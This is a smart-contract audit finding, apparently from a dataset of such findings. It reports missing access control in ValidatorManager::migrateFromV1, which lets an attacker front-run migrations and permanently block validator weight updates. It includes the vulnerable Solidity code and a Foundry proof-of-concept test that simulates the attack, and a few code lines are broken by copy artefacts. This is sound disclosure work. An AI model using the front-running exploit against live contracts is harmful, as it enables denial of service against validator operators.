# [H] Missing access control in ValidatorManager::migrateFromV1 allows front-running attack to permanently brick validator operations

## Summary
Severity: High
Contest weight: 0.0000
Dataset id: 23354
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Description: The ValidatorManager::migrateFromV1 function lacks access control, allowing any attacker to front-run legitimate V1-to-V2 validator migrations with malicious receivedNonce values. This permanently corrupts validator state, causing irreversible denial-of-service on all weight update operations and preventing validator removal.

The ValidatorManager::migrateFromV1 is marked as external with no access control modifier.
//ValidatorManager.sol
```solidity
function migrateFromV1(bytes32 validationID, uint32 receivedNonce) external { //@audit no access control
    ValidatorManagerStorage storage $ = _getValidatorManagerStorage();
    ValidatorLegacy storage legacy = $._validationPeriodsLegacy[validationID];
    if (legacy.status == ValidatorStatus.Unknown) {
        revert InvalidValidationID(validationID);
    }
    if (receivedNonce > legacy.messageNonce) {
        revert InvalidNonce(receivedNonce);
    } // @audit only checks receivedNonce > legacy message Nonce
    $._validationPeriods[validationID] = Validator({
        status: legacy.status,
        nodeID: legacy.nodeID,
        startingWeight: legacy.startingWeight,
        sentNonce: legacy.messageNonce,
        receivedNonce: receivedNonce, // ← Attacker-controlled
        weight: legacy.weight,
        startTime: legacy.startedAt,
        endTime: legacy.endedAt
    });
    $._validationPeriodsLegacy[validationID].status = ValidatorStatus.Unknown;
}
```

There is however an onlyOwner modifier in the BalancerValidatorManager
//BalancerValidatorManager.sol
```solidity
function migrateFromV1(bytes32 validationID, uint32 receivedNonce) external onlyOwner { //@audit owner
    only,!
    VALIDATOR_MANAGER.migrateFromV1(validationID, receivedNonce);
}
```

The check on receivedNonce prevents setting receivedNonce higher than legacy messageNonce but allows arbitrarily low values, including 0. This breaks the critical invariant that receivedNonce should be monotonically increasing and represent the actual state of P-Chain acknowledgments.

Consider a scenario where:
- System has validators in legacy storage (_validationPeriodsLegacy) that need migration to V2 (say receivedNonce = 10, sentNonce = 10)
- Legitimate owner prepares to call BalancerValidatorManager::migrateFromV1 with correct receivedNonce value
- Attacker front-runs this by calling ValidatorManager::migrateFromV1 with receivedNonce = 0
- After the update, _hasPendingWeightMsg will always be true because validator.sentNonce > validator.receivedNonce even though there are no pending acknowledgements on P-chain
- Any further calls to initiateValidatorWeightUpdate will always revert

Impact: If there are any pending V1 migrations, weight updates will face a permanent denial-of-service.

## Proof of Concept
Add the following test to BalancerValidatorManager.t.sol:
```solidity
function testExploit_FrontRunMigration_PermanentDoS() public {
    // Register a new validator through the security module
    vm.prank(testSecurityModules[0]);
    bytes32 targetValidationID = validatorManager.initiateValidatorRegistration(
        VALIDATOR_NODE_ID_01,
        VALIDATOR_01_BLS_PUBLIC_KEY,
        pChainOwner,
        pChainOwner,
        VALIDATOR_WEIGHT
    );
    // complete the registration
    vm.prank(testSecurityModules[0]);
    validatorManager.completeValidatorRegistration(
        COMPLETE_VALIDATOR_REGISTRATION_MESSAGE_INDEX
    );
    // Verify validator is active
    Validator memory validator = ValidatorManager(vmAddress).getValidator(targetValidationID);
    assertEq(
        uint8(validator.status), uint8(ValidatorStatus.Active), "Validator should be active"
    );
    assertEq(validator.sentNonce, 0, "Initial sentNonce should be 0");
    assertEq(validator.receivedNonce, 0, "Initial receivedNonce should be 0");
    // warp beyond churn period
    vm.warp(1_704_067_200 + 2 hours);
    // Update 1: Increase weight to 200,000
    vm.prank(testSecurityModules[0]);
    (uint64 nonce1,) =
        validatorManager.initiateValidatorWeightUpdate(targetValidationID, 200_000);
    assertEq(nonce1, 1, "First update should have nonce 1");
    vm.prank(testSecurityModules[0]);
    validatorManager.completeValidatorWeightUpdate(
        COMPLETE_VALIDATOR_WEIGHT_UPDATE_MESSAGE_INDEX
    );
    // Verify state after updates
    Validator memory currentValidator =
        ValidatorManager(vmAddress).getValidator(targetValidationID);
    assertEq(currentValidator.sentNonce, 1, "Should have sent 1 update");
    assertEq(currentValidator.receivedNonce, 1, "Should have received 1 acknowledgment");
    assertEq(currentValidator.weight, 200_000, "Weight should be updated");
    //// *** Setup V1 -> V2 Migration ***
    bytes32 storageSlot = 0xe92546d698950ddd38910d2e15ed1d923cd0a7b3dde9e2a6a3f380565559cb00;
    // _validationPeriodsLegacy is at offset 5
    bytes32 legacyMappingSlot = bytes32(uint256(storageSlot) + 5);
    bytes32 legacyValidatorSlot = keccak256(abi.encode(targetValidationID, legacyMappingSlot));
    vm.store(vmAddress, legacyValidatorSlot, bytes32(uint256(2)));
    // Store actual nodeID data
    bytes32 nodeIDPacked = bytes32(VALIDATOR_NODE_ID_01) | bytes32(uint256(20) << 1); // length in
    last byte (length * 2 for short bytes),!
    vm.store(vmAddress, bytes32(uint256(legacyValidatorSlot) + 1), nodeIDPacked);
    // Slot 2: startingWeight
    bytes32 slot2Value = bytes32(
        (uint256(currentValidator.startTime) << 192) // startedAt first (leftmost)
        | (uint256(200_000) << 128) // weight
        | (uint256(1) << 64) // messageNonce = 1
        | uint256(currentValidator.startingWeight) // startingWeight (rightmost)
    );
    vm.store(vmAddress, bytes32(uint256(legacyValidatorSlot) + 2), slot2Value);
    // Slot 3: endedAt
    vm.store(
        vmAddress,
        bytes32(uint256(legacyValidatorSlot) + 3),
        bytes32(uint256(currentValidator.endTime))
    );
    // Legitimate owner wants to migrate with correct receivedNonce = 2
    // But attacker's transaction executes first with receivedNonce = 0
    address attacker = address(0x6666);
    vm.prank(attacker);
    ValidatorManager(vmAddress).migrateFromV1(targetValidationID, 0);
    // Verify corrupted state
    Validator memory corruptedValidator =
        ValidatorManager(vmAddress).getValidator(targetValidationID);
    assertEq(corruptedValidator.sentNonce, 1, "sentNonce should be 1 from legacy");
    assertEq(corruptedValidator.receivedNonce, 0, "receivedNonce corrupted to 0 by attacker");
    assertEq(
        uint8(corruptedValidator.status), uint8(ValidatorStatus.Active), "Should be Active"
    );
    // Legitimate owner cannot fix the migration
    // Owner tries to migrate with correct value but it's too late
    vm.prank(validatorManagerOwnerAddress);
    vm.expectRevert(); // Will revert because legacy.status was set to Unknown
    ValidatorManager(vmAddress).migrateFromV1(targetValidationID, 1);
    // IMPACT 2: Cannot initiate weight updates (Permanent DoS)
    // First, we need to assign this validator to a security module
    // In the real scenario, this would happen during normal operation
    bytes32 balancerStorageSlot =
        0x9d2d7650aa35ca910e5b713f6b3de6524a06fbcb31ffc9811340c6f331a23400;
    bytes32 validatorSecurityModuleMappingSlot = bytes32(uint256(balancerStorageSlot) + 2);
    bytes32 validatorSecurityModuleSlot =
        keccak256(abi.encode(targetValidationID, validatorSecurityModuleMappingSlot));
    vm.store(
        address(validatorManager),
        validatorSecurityModuleSlot,
        bytes32(uint256(uint160(testSecurityModules[0])))
    );
    // Try to initiate weight update from security module
    vm.prank(testSecurityModules[0]);
    vm.expectRevert(
        abi.encodeWithSelector(
            IBalancerValidatorManager.BalancerValidatorManager__PendingWeightUpdate.selector,
            targetValidationID
        )
    );
    validatorManager.initiateValidatorWeightUpdate(targetValidationID, 200_000);
}
```

## Recommendation
Recommended Mitigation: Do not deploy BalancerValidatorManager on top of a ValidatorManager that has validators in legacy storage. Alternatively, complete V1 migration before BalancerValidatorManager is deployed.
